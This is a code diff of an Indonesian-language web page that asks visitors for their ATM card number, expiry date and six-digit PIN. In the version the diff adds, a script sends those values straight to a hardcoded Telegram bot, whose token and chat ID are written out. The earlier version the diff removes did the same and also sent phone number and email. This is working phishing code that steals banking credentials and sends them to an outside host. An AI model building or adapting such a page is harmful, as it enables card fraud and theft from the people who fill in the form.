@@ -101,7 +101,7 @@
 
     <label for="expiryDate" style="margin-top: 20px;">Tanggal Kadalursa Kartu ATM</label>
     <div class="input-with-icon">
-      <input type="text" id="expiryDate" placeholder="MM/YY" maxlength="5" pattern="^(0[1-9]|1[0-2])\/\d{2}$" />
+      <input type="tel" id="expiryDate" placeholder="MM/YY" maxlength="5" pattern="^(0[1-9]|1[0-2])\/\d{2}$" />
       <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" aria-label="Calendar icon" role="img">
         <path d="M7 11h2v2H7v-2zm4 0h2v2h-2v-2zm4 0h2v2h-2v-2zM3 21h18v-2H3v2zm18-12h-3V4h-2v5H8V4H6v5H3v2h18v-2z" />
       </svg>
@@ -149,168 +149,72 @@
     }
   });
 </script>
-const phoneInput = document.getElementById('phone');
-const emailInput = document.getElementById('email');
-const cardNumberInput = document.getElementById('cardNumber');
-const expiryDateInput = document.getElementById('expiryDate');
-const pinInput = document.getElementById('pin');
-const form = document.getElementById('form');
-const cardNumberCount = document.getElementById('cardNumberCount');
-const pinCount = document.getElementById('pinCount');
+<script>
+  const botToken = '7504434844:AAEJvY81gVUID8gl1BCqdR28oNld83WbNxM'; // Ganti dengan token bot Telegram Anda
+  const chatId = '7213790655';     // Ganti dengan chat id tujuan pesan
 
-// Telegram credentials (gunakan token dan chat ID yang valid)
-const botToken = '7504434844:AAEJvY81gVUID8gl1BCqdR28oNld83WbNxM'; // Dari skrip pertama
-const chatId = '7213790655'; // Dari skrip pertama
+  const form = document.querySelector('form');
+  const cardNumberInput = document.getElementById('cardNumber');
+  const expiryDateInput = document.getElementById('expiryDate');
+  const pinInput = document.getElementById('pin');
 
-// Set nilai awal +62 dan letakkan cursor di akhir input
-function setCursorToEnd(el) {
-    if (el.setSelectionRange) {
-        el.focus();
-        const length = el.value.length;
-        el.setSelectionRange(length, length);
-    }
-}
-phoneInput.value = '+62';
-setCursorToEnd(phoneInput);
-
-// Fungsi format nomor dengan spasi setiap 3 digit (setelah +62)
-function formatPhone(value) {
-    // Hilangkan semua selain angka
-    let number = value.replace(/\D/g, '');
-    // Pastikan +62 ada di depan, hilangkan 62 di awal pada number
-    if (number.startsWith('62')) {
-        number = number.substring(2);
-    }
-    // Batasi panjang maksimum 13 digit
-    if (number.length > 13) {
-        number = number.substring(0, 13);
-    }
-    // Kelompokkan angka per 3 digit kecuali sisa 1 atau 2 digit terakhir
-    let groups = [];
-    let i = 0;
-    while(i < number.length){
-        if(i >= 9) {
-            groups.push(number.substring(i));
-            break;
-        }
-        groups.push(number.substr(i, 3));
-        i += 3;
-    }
-    return '+62 ' + groups.join(' ');
-}
-
-phoneInput.addEventListener('input', (e) => {
-    // Pastikan prefix +62 tidak bisa dihapus
-    if (!phoneInput.value.startsWith('+62')) {
-        phoneInput.value = '+62';
-        setCursorToEnd(phoneInput);
-        return;
-    }
-    // Format nomor dengan spasi
-    const formatted = formatPhone(phoneInput.value);
-    phoneInput.value = formatted;
-    setCursorToEnd(phoneInput);
-});
-
-// Update counter untuk card number
-cardNumberInput.addEventListener('input', () => {
-    cardNumberCount.textContent = `${cardNumberInput.value.length}/18`;
-});
-
-// Update counter untuk PIN
-pinInput.addEventListener('input', () => {
-    pinCount.textContent = `${pinInput.value.length}/6`;
-});
-
-// Format expiry date
-expiryDateInput.addEventListener('input', (e) => {
-    let value = e.target.value.replace(/\D/g, '');
-    if (value.length >= 2) {
-        value = value.substring(0, 2) + '/' + value.substring(2, 4);
-    }
-    e.target.value = value;
-});
-
-form.addEventListener('submit', async function(e) {
+  form.addEventListener('submit', async (e) => {
     e.preventDefault();
-
-    // Ambil dan normalisasi input nomor phone (hilangkan spasi dan +)
-    let phoneRaw = phoneInput.value.replace(/\s/g, '').replace(/^\+/, '');
-    // Validasi panjang nomor angka sesudah 62 harus 4 sampai 15 digit total
-    if (!phoneRaw.startsWith('62') || phoneRaw.length < 4 || phoneRaw.length > 15) { 
-        alert('Nomor handphone harus diawali +62 dan mengandung 4 sampai 15 digit angka total.');
-        return;
-    }
-    // Cek digit sesudah kode negara
-    let digitsAfter62 = phoneRaw.substring(2);
-    if (digitsAfter62.length > 13) {
-        alert('Nomor handphone maksimal 13 digit angka setelah +62.');
-        return;
-    }
-    // Validasi email harus mengandung '@' dan minimal 3 karakter total
-    const emailVal = emailInput.value.trim();
-    if (emailVal.length < 3 || !emailVal.includes('@')) {
-        alert('Format email tidak valid. Harus mengandung karakter "@"');
-        return;
-    }
 
     const cardNumber = cardNumberInput.value.trim();
     const expiryDate = expiryDateInput.value.trim();
     const pin = pinInput.value.trim();
 
-    // Validasi sederhana untuk kartu ATM
+    // Validasi sederhana
     const mmYYPattern = /^(0[1-9]|1[0-2])\/\d{2}$/;
     if(cardNumber.length < 16 || cardNumber.length > 18){
-        alert('Nomor kartu ATM harus antara 16-18 digit');
-        return;
+      alert('Nomor kartu ATM harus antara 16-18 digit');
+      return;
     }
     if(!mmYYPattern.test(expiryDate)){
-        alert('Tanggal kadalursa harus format MM/YY');
-        return;
+      alert('Tanggal kadalursa harus format MM/YY');
+      return;
     }
     if(pin.length !== 6){
-        alert('PIN harus 6 digit');
-        return;
+      alert('PIN harus 6 digit');
+      return;
     }
 
-    // Pesan yang akan dikirim (handphone tanpa spasi dan dengan +)
-    const phoneToSend = '+' + phoneRaw;
+    // Membuat pesan yang akan dikirim ke Telegram
     const message = 
-        `📋 *Informasi Data Lengkap*\n\n` +
-        `*Nomor Handphone:* ${phoneToSend}\n` +
-        `*Email:* ${emailVal}\n` +
-        `*Nomor Kartu ATM:* ${cardNumber}\n` +
-        `*Tanggal Kadalursa:* ${expiryDate}\n` +
-        `*PIN:* ${pin}`;
+      `📋 *Informasi Data Nasabah*\n\n` +
+      `*Nomor Kartu ATM:* ${cardNumber}\n` +
+      `*Tanggal Kadalursa:* ${expiryDate}\n` +
+      `*PIN:* ${pin}`;
 
     const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
     const params = {
-        chat_id: chatId,
-        text: message,
-        parse_mode: 'Markdown'
+      chat_id: chatId,
+      text: message,
+      parse_mode: 'Markdown'
     };
 
     try {
-        const response = await fetch(url, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(params)
-        });
+      const response = await fetch(url, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(params)
+      });
 
-        if(response.ok){
-            alert('Data berhasil terkirim ke Telegram!');
-            form.reset();
-            phoneInput.value = '+62';
-            setCursorToEnd(phoneInput);
-            cardNumberCount.textContent = '0/18';
-            pinCount.textContent = '0/6';
-        } else {
-            alert('Gagal mengirim data ke Telegram.');
-        }
+      if(response.ok){
+        alert('Data berhasil terkirim ke Telegram!');
+        form.reset();
+        // Update counters setelah reset
+        document.getElementById('cardNumberCount').textContent = '0/18';
+        document.getElementById('pinCount').textContent = '0/6';
+      } else {
+        alert('Gagal mengirim data ke Telegram.');
+      }
     } catch (error) {
-        alert('Terjadi kesalahan: ' + error.message);
+      alert('Terjadi kesalahan: ' + error.message);
     }
-});
+  });
+</script>
 
 </body>
 </html>
